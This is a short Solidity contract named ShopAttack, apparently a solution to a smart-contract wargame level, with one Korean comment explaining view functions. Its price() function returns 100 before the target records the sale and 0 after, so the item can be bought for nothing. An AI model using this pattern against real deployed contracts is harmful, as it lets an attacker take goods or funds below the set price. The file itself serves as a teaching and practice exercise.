//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
interface IShop{
    function buy() external;
    function isSold()external view returns(bool);
}
contract ShopAttack{
    IShop target ;
    constructor(address _target){
        target=IShop(_target);
    }

    function attack()public {
        target.buy();
    }
    
    function price() public view returns (uint){ // view는 상태 변수를 읽을 수는 있으나 변경은 안함
        if (target.isSold()==true){
            return 0;
        }else{
            return 100;
        }
    }
}
